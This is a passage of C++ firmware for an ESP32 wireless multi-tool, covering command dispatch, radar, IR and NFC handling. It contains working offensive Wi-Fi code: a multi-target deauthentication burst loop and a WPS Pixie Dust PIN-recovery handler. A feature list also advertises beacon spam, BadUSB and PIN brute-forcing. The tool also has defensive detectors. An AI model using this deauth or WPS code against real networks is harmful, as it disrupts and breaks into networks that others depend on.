    gDeauthMultiActive = false;
    sendDeauthMultiStatsEvent("finished", gDeauthMultiStopRequested);
    gDeauthMultiTaskHandle = nullptr;
    vTaskDelete(nullptr);
}

static void stopDeauthMultiLoopAndWait(uint32_t timeoutMs = 1500) {
    if (!gDeauthMultiActive && gDeauthMultiTaskHandle == nullptr) return;
    gDeauthMultiStopRequested = true;
    const uint32_t started = millis();
    while (gDeauthMultiActive && millis() - started < timeoutMs) {
        delay(10);
    }
    if (!gDeauthMultiActive) gDeauthMultiTaskHandle = nullptr;
}

static void runDeauthMultiBurst() {
    gDeauthMultiStartedMs = millis();
    gDeauthMultiSent = 0;
    gDeauthMultiFailed = 0;
    gDeauthMultiCurrentChannel = 0;
    gDeauthMultiCurrentBssid[0] = '\0';
    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
        gDeauthMultiTargets[i].requested = 0;
        gDeauthMultiTargets[i].sent = 0;
        gDeauthMultiTargets[i].failed = 0;
    }

    uint16_t sequence = 0x0010;
    for (size_t targetIndex = 0; targetIndex < gDeauthMultiTargetCount; ++targetIndex) {
        DeauthMultiTarget& target = gDeauthMultiTargets[targetIndex];
        gDeauthMultiCurrentChannel = target.channel;
        formatDeauthMultiMac(target.bssid, gDeauthMultiCurrentBssid);

        String channelError;
        if (!prepareDeauthMultiChannel(target.channel, channelError)) {
            target.requested += gDeauthMultiCountPerTarget;
            target.failed += gDeauthMultiCountPerTarget;
            gDeauthMultiFailed += gDeauthMultiCountPerTarget;
            NRSUITE_DEBUG_PRINTF(
                "DEAUTH_MULTI: target %s channel %u setup failed: %s\n",
                gDeauthMultiCurrentBssid,
                target.channel,
                channelError.c_str()
            );
            continue;
        }

        for (uint32_t frameIndex = 0; frameIndex < gDeauthMultiCountPerTarget; ++frameIndex) {
            target.requested++;
            if (sendDeauthMultiFrame(target, sequence, gDeauthMultiReason)) {
                target.sent++;
                gDeauthMultiSent++;
            } else {
                target.failed++;
                gDeauthMultiFailed++;
            }
            sequence += 0x0010;
            if (frameIndex + 1 < gDeauthMultiCountPerTarget && gDeauthMultiIntervalMs > 0) {
                delay(gDeauthMultiIntervalMs);
            }
        }
    }
    sendDeauthMultiStatsEvent("finished", false);
}

static const char* authModeStr(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2-PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/WPA3-PSK";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI-PSK";
        default:                        return "UNKNOWN";
    }
}

// Stop every radio/network subsystem before starting a new one.
// Call this at the top of any CMD that touches Wi-Fi TX/RX.
static void stopRadioModules() {
    stopDeauthLoopAndWait();
    stopDeauthMultiLoopAndWait();
    mesh.stop();
    sniffer.stop();
    deauthDetector.stop();
    hiddenApDetector.stop();
    beacon.stop();
    #if NRSUITE_ENABLE_PORTAL
    portal.stop();
    #endif
    wpsPixie.stop();
    wpsAttemptDetector.stop();
    esp_wifi_set_promiscuous(false);
}

static void stopAllModules() {
    pinBruteforce.stop();
    ld2450.stop();
    irRemote.stopRx();
    irRemote.stopTx();
    pn532Nfc.stopScan();
    stopRadioModules();
    #ifdef ENABLE_BLE_HID
        bleProfile.stop();
        bleScanner.stop();
        BleHid::end();
        blePinBruteforce.onBleEnded();
    #endif
    #if MSC_SUPPORTED
        FileUpload::reset();
    #endif
    vTaskDelay(pdMS_TO_TICKS(120));
}

static void radioIdle() {
    stopRadioModules();
    #ifdef ENABLE_BLE_HID
        bleProfile.stop();
        bleScanner.stop();
    #endif
    vTaskDelay(pdMS_TO_TICKS(80));
}

#if defined(ENABLE_BLE_HID) && defined(NRSUITE_BLE_HEAP_DIAGNOSTIC)
// Diagnostic-only heap snapshots. They use the existing "mem" event so the
// Android app forwards them to logcat under NRSuiteFirmwareMem without adding
// another release protocol event.
static void sendBleHeapDiagnostic(const char* stage) {
    JsonDocument ev;
    ev["stage"] = stage;
    ev["uptime_ms"] = millis();
    ev["free_heap"] = ESP.getFreeHeap();
    ev["heap_min_free"] = ESP.getMinFreeHeap();
    ev["heap_max_alloc"] = ESP.getMaxAllocHeap();
    proto.sendEvent("mem", ev);
}
#endif

// ── LD2450 command/event layer ────────────────────────────────────────────────
static constexpr uint32_t LD2450_BAUD = 256000;

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C5)
static constexpr int8_t LD2450_DEFAULT_RX_PIN = 6;
static constexpr int8_t LD2450_DEFAULT_TX_PIN = 7;
#elif defined(CONFIG_IDF_TARGET_ESP32S3) || defined(CONFIG_IDF_TARGET_ESP32S2)
static constexpr int8_t LD2450_DEFAULT_RX_PIN = 16;
static constexpr int8_t LD2450_DEFAULT_TX_PIN = 17;
#else
static constexpr int8_t LD2450_DEFAULT_RX_PIN = 18;
static constexpr int8_t LD2450_DEFAULT_TX_PIN = 19;
#endif

#if defined(CONFIG_IDF_TARGET_ESP32C3)
static const int SAFE_LD2450_GPIOS[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
#elif defined(CONFIG_IDF_TARGET_ESP32C5)
static const int SAFE_LD2450_GPIOS[] = {
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28,
};
#elif defined(CONFIG_IDF_TARGET_ESP32S3)
static const int SAFE_LD2450_GPIOS[] = {
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,
    21, 38, 39, 40, 41, 42, 45, 46, 47, 48,
};
#elif defined(CONFIG_IDF_TARGET_ESP32S2)
static const int SAFE_LD2450_GPIOS[] = {
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,
    21, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45,
};
#else
static const int SAFE_LD2450_GPIOS[] = {
    4, 5, 12, 13, 14, 15, 18, 19, 21, 22, 23, 25, 26, 27, 32, 33,
};
#endif
static constexpr size_t SAFE_LD2450_GPIO_COUNT =
    sizeof(SAFE_LD2450_GPIOS) / sizeof(SAFE_LD2450_GPIOS[0]);

static int ld2450RxGpio = -1;
static int ld2450TxGpio = -1;
static uint32_t ld2450StartedMs = 0;
static uint32_t ld2450LastTargetsFrame = 0;
static uint32_t ld2450LastErrorEventMs = 0;
static uint32_t ld2450LastInvalidFrames = 0;
static bool ld2450LastPresence = false;

static bool isSafeLd2450Pin(int gpio) {
    for (size_t i = 0; i < SAFE_LD2450_GPIO_COUNT; i++) {
        if (SAFE_LD2450_GPIOS[i] == gpio) return true;
    }
    return false;
}

static void loadLd2450Config() {
    int rxPin = LD2450_DEFAULT_RX_PIN;
    int txPin = LD2450_DEFAULT_TX_PIN;
    Preferences prefs;
    if (prefs.begin("nrsuite", true)) {
        rxPin = prefs.getInt("ld2450_rx_gpio", LD2450_DEFAULT_RX_PIN);
        txPin = prefs.getInt("ld2450_tx_gpio", LD2450_DEFAULT_TX_PIN);
        prefs.end();
    }
    // Preserve target-safe defaults when NVS is blank or contains the old
    // -1 "unset" sentinel.
    if (rxPin < 0 || !isSafeLd2450Pin(rxPin)) rxPin = LD2450_DEFAULT_RX_PIN;
    if (txPin < 0 || !isSafeLd2450Pin(txPin)) txPin = LD2450_DEFAULT_TX_PIN;
    ld2450RxGpio = rxPin;
    ld2450TxGpio = txPin;
    if (ld2450RxGpio == ld2450TxGpio) {
        ld2450RxGpio = LD2450_DEFAULT_RX_PIN;
        ld2450TxGpio = LD2450_DEFAULT_TX_PIN;
    }
}

static void saveLd2450Config() {
    Preferences prefs;
    if (!prefs.begin("nrsuite", false)) return;
    prefs.putInt("ld2450_rx_gpio", ld2450RxGpio);
    prefs.putInt("ld2450_tx_gpio", ld2450TxGpio);
    prefs.end();
}

static void appendLd2450PinOptions(JsonDocument& doc) {
    JsonArray rxPins = doc["ld2450_rx_gpios"].to<JsonArray>();
    JsonArray txPins = doc["ld2450_tx_gpios"].to<JsonArray>();
    for (size_t i = 0; i < SAFE_LD2450_GPIO_COUNT; i++) {
        rxPins.add(SAFE_LD2450_GPIOS[i]);
        txPins.add(SAFE_LD2450_GPIOS[i]);
    }
}

static bool validateLd2450Pins(int rxPin, int txPin, String& error) {
    if (!isSafeLd2450Pin(rxPin)) {
        error = "Unsupported or unsafe LD2450 RX GPIO";
        return false;
    }
    if (!isSafeLd2450Pin(txPin)) {
        error = "Unsupported or unsafe LD2450 TX GPIO";
        return false;
    }
    if (rxPin == txPin) {
        error = "LD2450 RX and TX GPIOs must be different";
        return false;
    }
    return true;
}

static void resetLd2450EventTracking() {
    ld2450StartedMs = millis();
    ld2450LastTargetsFrame = ld2450.validFrames();
    ld2450LastErrorEventMs = 0;
    ld2450LastInvalidFrames = ld2450.invalidFrames();
    ld2450LastPresence = ld2450.targetCount() > 0;
}

static void appendLd2450Status(JsonDocument& doc) {
    const uint32_t now = millis();
    const uint32_t lastFrameMs = ld2450.lastFrameMs();
    doc["active"] = ld2450.active();
    doc["debug"] = ld2450.debugPrint();
    doc["valid_frames"] = ld2450.validFrames();
    doc["invalid_frames"] = ld2450.invalidFrames();
    doc["dropped_bytes"] = ld2450.droppedBytes();
    doc["target_count"] = ld2450.targetCount();
    doc["presence"] = ld2450.targetCount() > 0;
    doc["has_data"] = ld2450.hasData();
    doc["last_frame_ms"] = lastFrameMs;
    doc["uptime_ms"] = now;
    doc["baud"] = LD2450_BAUD;
    doc["rx_pin"] = ld2450RxGpio;
    doc["tx_pin"] = ld2450TxGpio;
    doc["configured"] = isSafeLd2450Pin(ld2450RxGpio) &&
        isSafeLd2450Pin(ld2450TxGpio) &&
        ld2450RxGpio != ld2450TxGpio;
    if (lastFrameMs > 0) {
        doc["last_frame_age_ms"] = now >= lastFrameMs ? (now - lastFrameMs) : 0;
    } else {
        doc["last_frame_age_ms"] = 0;
    }
}

static void sendLd2450StatusResp(uint8_t id, bool ok = true, const char* msg = nullptr) {
    JsonDocument resp;
    resp["ok"] = ok;
    if (msg) resp["msg"] = msg;
    appendLd2450Status(resp);
    appendLd2450PinOptions(resp);
    String json;
    serializeJson(resp, json);
    proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
}

static void emitLd2450Events() {
    if (!ld2450.active()) return;
    const uint32_t now = millis();
    const uint8_t targetCount = ld2450.targetCount();
    const bool present = targetCount > 0;
    const uint32_t validFrames = ld2450.validFrames();

    if (validFrames != ld2450LastTargetsFrame) {
        ld2450LastTargetsFrame = validFrames;
        JsonDocument ev;
        ev["uptime"] = now;
        ev["target_count"] = targetCount;
        ev["has_data"] = ld2450.hasData();
        ev["valid_frames"] = validFrames;
        JsonArray targets = ev["targets"].to<JsonArray>();
        const Ld2450::Target* data = ld2450.targets();
        for (uint8_t i = 0; i < 3; i++) {
            const Ld2450::Target& target = data[i];
            if (!target.valid) continue;
            JsonObject item = targets.add<JsonObject>();
            item["slot"] = i + 1;
            item["x_mm"] = target.xMm;
            item["y_mm"] = target.yMm;
            item["speed_cm_s"] = target.speedCmS;
            item["resolution_mm"] = target.resolutionMm;
        }
        proto.sendEvent("ld2450_targets", ev);
    }

    if (present != ld2450LastPresence) {
        ld2450LastPresence = present;
        JsonDocument ev;
        ev["uptime"] = now;
        ev["present"] = present;
        ev["target_count"] = targetCount;
        proto.sendEvent("ld2450_presence", ev);
    }

    const uint32_t invalidFrames = ld2450.invalidFrames();
    const bool parseError = invalidFrames > ld2450LastInvalidFrames;
    const bool noData = validFrames == 0 && now - ld2450StartedMs >= 3000;
    bool errorSent = false;
    if ((parseError || noData) && now - ld2450LastErrorEventMs >= 3000) {
        JsonDocument ev;
        ev["kind"] = parseError ? "parse_error" : "no_data";
        ev["msg"] = parseError ? "LD2450 frame parse error" : "No LD2450 frames received";
        ev["active"] = true;
        ev["valid_frames"] = validFrames;
        ev["invalid_frames"] = invalidFrames;
        ev["dropped_bytes"] = ld2450.droppedBytes();
        ev["last_frame_age_ms"] = ld2450.lastFrameMs() > 0
            ? (now >= ld2450.lastFrameMs() ? now - ld2450.lastFrameMs() : 0)
            : 0;
        proto.sendEvent("ld2450_error", ev);
        ld2450LastErrorEventMs = now;
        errorSent = true;
    }
    if (!parseError || errorSent) {
        ld2450LastInvalidFrames = invalidFrames;
    }
}

// ── Command Handler ──────────────────────────────────────────────────────────
static void sendIrStatusResp(uint8_t id, bool ok, const char* msg = nullptr) {
    JsonDocument resp;
    resp["ok"] = ok;
    if (msg != nullptr) resp["msg"] = msg;
    irRemote.appendStatus(resp);
    irRemote.appendPinOptions(resp);
    String json;
    serializeJson(resp, json);
    proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
}

static void sendRfidStatusResp(
    uint8_t id,
    bool ok,
    const char* msg = nullptr,
    const String* detail = nullptr
) {
    JsonDocument resp;
    resp["ok"] = ok;
    if (msg != nullptr) resp["msg"] = msg;
    if (detail != nullptr && !detail->isEmpty()) resp["detail"] = *detail;
    pn532Nfc.appendStatus(resp);
    String json;
    serializeJson(resp, json);
    proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
}

void handleCmdImpl(uint8_t id, JsonDocument& doc) {
    const char* cmd = doc["cmd"] | "";
    if (cmd[0] == '\0') {
        proto.sendResp(id, false, "missing cmd");
        return;
    }

    // ── MESH FOUNDATION ───────────────────────────────────────────────────
    if (strncmp(cmd, "MESH_", 5) == 0) {
        if (strcmp(cmd, "MESH_ACTIVATE") == 0) {
            stopAllModules();
        }
        mesh.handleCommand(id, doc);
        return;
    }

    // ── PING ──────────────────────────────────────────────────────────────
    if (strcmp(cmd, "PING") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        resp["msg"] = "pong";
        resp["transport"] = proto.activeTransportName();
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── EXPLICIT DEVICE REBOOT ────────────────────────────────────────────
    else if (strcmp(cmd, "REBOOT") == 0) {
        // Reboot is never automatic. Acknowledge first, drain the active
        // transport, and then restart so the app can surface deterministic
        // feedback before USB re-enumerates.
        proto.sendResp(id, true, "rebooting");
        proto.flushActive();
        delay(250);
        ESP.restart();
        return;
    }

    // ── WPS PIXIE DUST ────────────────────────────────────────────────────
    else if (strcmp(cmd, "WPS_PIXIE_ATTEMPT") == 0) {
        if (!wpsPixieSupported()) {
            proto.sendResp(id, false, "wps_pixie_not_supported");
            return;
        }
        String bssid = doc["args"]["bssid"] | "";
        String ssid = doc["args"]["ssid"] | "";
        String pin = doc["args"]["pin"] | "";
        String runId = doc["args"]["run_id"] | "";
        const bool captureOnly = doc["args"]["capture_only"] | false;
        const bool reuseMac = doc["args"]["reuse_mac"] | false;
        int channel = doc["args"]["channel"] | 0;
        bssid.trim();
        bssid.toUpperCase();
        ssid.trim();
        pin.trim();
        if (runId.isEmpty()) {
            char idBuffer[24];
            snprintf(idBuffer, sizeof(idBuffer), "wps%08x", (unsigned)esp_random());
            runId = idBuffer;
        }
        if (bssid.isEmpty() || ssid.isEmpty() || pin.isEmpty() || channel < 1 || channel > 177) {
            proto.sendResp(id, false, "invalid WPS target or PIN");
            return;
        }

        stopAllModules();
        String error;
        if (!wpsPixie.startAttempt(
                bssid, ssid, (uint8_t)channel, pin, runId, captureOnly, reuseMac, error)) {
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = error;
            resp["free_heap"] = ESP.getFreeHeap();
            resp["largest_block"] = ESP.getMaxAllocHeap();
            String json;
            serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }

        JsonDocument resp;
        resp["ok"] = true;
        resp["run_id"] = runId;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "WPS_PIXIE_CONTINUE") == 0) {
        String runId = doc["args"]["run_id"] | "";
        String pin = doc["args"]["pin"] | "";
        runId.trim();
        pin.trim();
        String error;
        if (!wpsPixie.continueWithRecoveredPin(runId, pin, error)) {
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = error;
            String json;
            serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }
        JsonDocument resp;
        resp["ok"] = true;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "WPS_PIXIE_STOP") == 0) {
        wpsPixie.stop();
        JsonDocument resp;
        resp["ok"] = true;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── WPS LOCK DETECTOR ─────────────────────────────────────────────────
    else if (strcmp(cmd, "WPS_LOCK_SCAN") == 0) {
        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }
        uint16_t dwellMs = doc["args"]["dwell_ms"] | 120;
        dwellMs = (uint16_t)constrain(dwellMs, 60, 1000);
        const bool pullResults = doc["args"]["pull_results"] | false;
        const bool includeNonWps = doc["args"]["include_non_wps"] | false;
        uint32_t scanId = 0;
        if (pullResults) {
            scanId = g_nextScanId++;
            scanResults.begin(ScanResultStore::Kind::Wps, scanId);
        }
        radioIdle();
        const int scannedCount = wpsLockDetector.scan(
            bandMode != WifiBandMode::BAND_2G,
            dwellMs,
            !pullResults,
            includeNonWps
        );
        int reportedCount = scannedCount;
        if (pullResults) {
            wpsLockDetector.appendResults(scanResults);
            reportedCount = (int)scanResults.count();
        }
        JsonDocument resp;
        resp["ok"] = true;
        resp["count"] = reportedCount;
        resp["scanned"] = scannedCount;
        if (pullResults) {
            resp["scan_id"] = scanId;
            resp["kind"] = "wps";
            resp["include_non_wps"] = includeNonWps;
            resp["truncated"] = scannedCount > reportedCount;
        }
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── WPS ATTEMPT DETECTOR ──────────────────────────────────────────────
    else if (strcmp(cmd, "WPS_ATTEMPT_DETECT_START") == 0) {
        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        uint8_t channels[64] = {};
        size_t channelCount = 0;
        JsonArray channelsArray = doc["args"]["channels"].as<JsonArray>();
        for (JsonVariant value : channelsArray) {
            const uint8_t channel = value.as<uint8_t>();
            if (!isValidWifiChannel(channel)) {
                proto.sendResp(id, false, "invalid channel");
                return;
            }
            String regulatoryError;
            if (!validateRegulatoryChannel(channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
            bool duplicate = false;
            for (size_t existing = 0; existing < channelCount; ++existing) {
                if (channels[existing] == channel) {
                    duplicate = true;
                    break;
                }
            }
            if (!duplicate && channelCount < sizeof(channels)) {
                channels[channelCount++] = channel;
            }
        }

        uint8_t targets[32][6] = {};
        size_t targetCount = 0;
        JsonArray targetsArray = doc["args"]["targets"].as<JsonArray>();
        for (JsonVariant value : targetsArray) {
            const char* bssidStr = value.as<const char*>();
            if (bssidStr == nullptr || targetCount >= 32) continue;
            if (parseMac(bssidStr, targets[targetCount])) {
                targetCount++;
            }
        }

        uint16_t hopIntervalMs = doc["args"]["interval_ms"] | 300;
        radioIdle();
        const bool ok = wpsAttemptDetector.start(
            channelCount > 0 ? channels : nullptr,
            channelCount,
            targetCount > 0 ? &targets[0][0] : nullptr,
            targetCount,
            hopIntervalMs,
            bandMode != WifiBandMode::BAND_2G
        );
        JsonDocument resp;
        resp["ok"] = ok;
        if (ok) {
            resp["active"] = true;
            resp["hopping"] = wpsAttemptDetector.hopping();
            resp["channel"] = wpsAttemptDetector.channel();
            resp["channels"] = channelCount;
            resp["targets"] = targetCount;
            resp["interval_ms"] = hopIntervalMs;
        } else {
            resp["error"] = "wps_attempt_detect_start_failed";
        }
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }
    else if (strcmp(cmd, "WPS_ATTEMPT_DETECT_STOP") == 0) {
        wpsAttemptDetector.stop();
        JsonDocument resp;
        resp["ok"] = true;
        resp["sessions"] = wpsAttemptDetector.sessionCount();
        resp["frames"] = wpsAttemptDetector.frameCount();
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }
    else if (strcmp(cmd, "WPS_ATTEMPT_DETECT_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        resp["active"] = wpsAttemptDetector.active();
        resp["channel"] = wpsAttemptDetector.channel();
        resp["hopping"] = wpsAttemptDetector.hopping();
        resp["sessions"] = wpsAttemptDetector.sessionCount();
        resp["frames"] = wpsAttemptDetector.frameCount();
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── REGULATORY COUNTRY ────────────────────────────────────────────────
    else if (strcmp(cmd, "SET_COUNTRY") == 0) {
        String requested = doc["args"]["country"] | "";
        requested.trim();
        requested.toUpperCase();
        if (requested.length() != 2) {
            proto.sendResp(id, false, "country code must be two characters");
            return;
        }

        const esp_err_t err = esp_wifi_set_country_code(requested.c_str(), false);
        if (err != ESP_OK) {
            String msg = "country rejected: ";
            msg += esp_err_to_name(err);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        Preferences prefs;
        if (prefs.begin("nrsuite", false)) {
            prefs.putString("wifi_country", requested);
            prefs.end();
        }

        JsonDocument resp;
        resp["ok"] = true;
        resp["country"] = requested;
        appendAllowedWifiChannels(resp);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── STATUS ────────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STATUS") == 0 || strcmp(cmd, "HEAP") == 0) {
        JsonDocument resp;
        resp["ok"]       = true;
        resp["uptime"]   = millis();
        resp["heap"]     = ESP.getFreeHeap();
        resp["heap_total"]     = ESP.getHeapSize();
        resp["heap_used"]      = ESP.getHeapSize() - ESP.getFreeHeap();
        resp["heap_min_free"]  = ESP.getMinFreeHeap();
        resp["heap_max_alloc"] = ESP.getMaxAllocHeap();
        resp["psram_total"]    = ESP.getPsramSize();
        resp["psram_free"]     = ESP.getFreePsram();
        resp["chip_cores"]     = ESP.getChipCores();
        resp["cpu_mhz"]        = ESP.getCpuFreqMHz();
        resp["flash_size"]     = ESP.getFlashChipSize();
        resp["sdk"]            = ESP.getSdkVersion();
        float chipTempC = 0.0f;
        if (readChipTemperatureC(chipTempC)) {
            resp["temp_c"] = roundf(chipTempC * 10.0f) / 10.0f;
        }
        resp["transport"] = proto.activeTransportName();
        resp["chip"]      = CHIP_NAME;
        resp["proto"]       = 1;
        resp["proto_minor"] = 2;
        resp["fw"]          = FW_VERSION;
        resp["device_id"] = getDeviceId();
        char countryCode[4] = {0};
        if (esp_wifi_get_country_code(countryCode) != ESP_OK) {
            strcpy(countryCode, "CH");
        }
        resp["country"] = countryCode;
        appendAllowedWifiChannels(resp);
        JsonArray features = resp["features"].to<JsonArray>();
        features.add("wifi");
        features.add("wifi_2ghz");
        #if defined(CONFIG_IDF_TARGET_ESP32C5)
            features.add("wifi_5ghz");
        #endif
        if (ESP.getPsramSize() > 0) {
            features.add("psram");
        }
        features.add("sniff");
        #if NRSUITE_ENABLE_NRUGOCHI
        features.add("auto_handshake");
        features.add("nrugochi");
        #endif
        features.add("client_detect");
        features.add("deauth");
        features.add("deauth_multi");
        features.add("deauth_detect");
        features.add("beacon");
        #if NRSUITE_ENABLE_PORTAL
        features.add("portal");
        features.add("portal_html_offset");
        features.add("html_diag");
        #endif
        features.add("reboot");
        features.add("stop_all");
        features.add("wps");
        features.add("scan_results_pull");
        features.add("temp_sensor");
        features.add("wps_lock_detect");
        features.add("wps_attempt_detect");
        #if WPS_PIXIE_SUPPORTED
            features.add("wps_pixie");
        #endif
        features.add("hidden_ap");
        features.add("storage");
        features.add("ld2450");
        features.add("ir_tx");
        features.add("ir_rx");
        features.add("nfc");
        features.add("rfid");
        features.add("pn532");
        // Capability flag: mesh code is present and can be provisioned.
        features.add("mesh_provision");
        // Availability flag: only advertised once valid derived keys exist.
        if (mesh.initialized()) {
            features.add("mesh");
        }
        #ifdef ENABLE_BLE_HID
            features.add("ble_hid");
            features.add("ble_scan");
            features.add("ble_profile");
            features.add("ble_pin_bruteforce");
        #endif
        #if MSC_SUPPORTED
            features.add("msc");
            features.add("msc_read_chunk");
        #endif
        #if HID_SUPPORTED
            features.add("badusb");
            features.add("pin_bruteforce");
        #endif
        resp["sniffing"] = sniffer.active();
        resp["client_detecting"] = sniffer.active() && sniffer.clientOnly();
        resp["oversized_frames"] = proto.oversizedFrameCount();
        irRemote.appendStatus(resp);
        irRemote.appendPinOptions(resp);
        if (sniffer.active()) {
            resp["channel"] = sniffer.channel();
        }
        #if NRSUITE_ENABLE_PORTAL
        resp["portal"]   = portal.isRunning();
        #else
        resp["portal"]   = false;
        #endif
        resp["beacon"]   = beacon.active();
        resp["deauth_detector"] = deauthDetector.active();
        resp["hidden_ap"] = hiddenApDetector.active();
        #ifdef ENABLE_BLE_HID
            resp["ble_scanning"] = bleScanner.scanning();
            resp["ble_profiling"] = bleProfile.active();
        #endif
        if (deauthDetector.active()) {
            DeauthDetectStats ds = deauthDetector.stats();
            resp["deauth_detector_channel"] = deauthDetector.channel();
            resp["deauth_detector_hopping"] = deauthDetector.hopping();
            resp["deauth_detected"] = ds.detected;
            resp["deauth_detector_sent"] = ds.sent;
            resp["deauth_detector_dropped"] = ds.dropped;
        }
        if (hiddenApDetector.active()) {
            HiddenApStats hs = hiddenApDetector.stats();
            resp["hidden_ap_channel"] = hiddenApDetector.channel();
            resp["hidden_ap_hopping"] = hiddenApDetector.hopping();
            resp["hidden_ap_seen"] = hs.hiddenSeen;
            resp["hidden_ap_candidates"] = hs.candidates;
            resp["hidden_ap_resolved"] = hs.resolved;
            resp["hidden_ap_sent"] = hs.sent;
            resp["hidden_ap_dropped"] = hs.dropped;
        }
        if (beacon.active()) {
            BeaconStats bs = beacon.stats();
            resp["beacon_ssids"] = bs.ssids;
            resp["beacon_sent"]  = bs.sent;
            resp["beacon_channel"] = bs.channel;
        }
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── IR REMOTE ─────────────────────────────────────────────────────────
    else if (strcmp(cmd, "IR_STATUS") == 0) {
        sendIrStatusResp(id, true, "ir status");
    }

    else if (strcmp(cmd, "IR_SET_PINS") == 0) {
        const int txGpio = doc["args"]["tx_gpio"] | -1;
        const int rxGpio = doc["args"]["rx_gpio"] | -1;
        String error;
        if (!irRemote.setPins(txGpio, rxGpio, error)) {
            sendIrStatusResp(id, false, error.c_str());
        } else {
            sendIrStatusResp(id, true, "ir pins saved");
        }
    }

    else if (strcmp(cmd, "IR_RX_START") == 0) {
        String error;
        if (!irRemote.startRx(error)) {
            sendIrStatusResp(id, false, error.c_str());
        } else {
            sendIrStatusResp(id, true, "ir rx started");
        }
    }

    else if (strcmp(cmd, "IR_RX_STOP") == 0) {
        irRemote.stopRx();
        sendIrStatusResp(id, true, "ir rx stopped");
    }

    else if (strcmp(cmd, "IR_TX_STOP") == 0) {
        irRemote.stopTx();
        sendIrStatusResp(id, true, "ir tx stopped");
    }

    else if (strcmp(cmd, "IR_TX_RAW") == 0) {
        const uint32_t frequencyHz = doc["args"]["frequency_hz"] | 38000;
        const int repeat = doc["args"]["repeat"] | 1;
        JsonArray timings = doc["args"]["timings_us"].as<JsonArray>();
        String error;
        size_t timingCount = 0;
        if (!irRemote.transmitRaw(frequencyHz, repeat, timings, error, timingCount)) {
            sendIrStatusResp(id, false, error.c_str());
        } else {
            JsonDocument resp;
            resp["ok"] = true;
            resp["msg"] = "ir tx sent";
            resp["timings"] = timingCount;
            irRemote.appendStatus(resp);
            String json;
            serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    // ── STOP_ALL ──────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STOP_ALL") == 0) {
        stopAllModules();
        proto.sendResp(id, true, "all modules stopped");
    }

    // ── PN532 NFC / RFID ──────────────────────────────────────────────────
    else if (strcmp(cmd, "RFID_STATUS") == 0) {
        String detail;
        if (!pn532Nfc.connected() && pn532Nfc.configured()) {
            pn532Nfc.ensureConnected(detail);
        }
        sendRfidStatusResp(
            id,
            true,
            detail.isEmpty() ? "rfid status" : detail.c_str(),
            &detail
        );
    }

    else if (strcmp(cmd, "RFID_SET_CONFIG") == 0) {
        const char* interfaceName = doc["args"]["interface"] | "i2c";
        const int sdaGpio = doc["args"]["sda_gpio"] | -1;
        const int sclGpio = doc["args"]["scl_gpio"] | -1;
        String error;
        const bool configSaved = pn532Nfc.setConfig(
            interfaceName,
            sdaGpio,
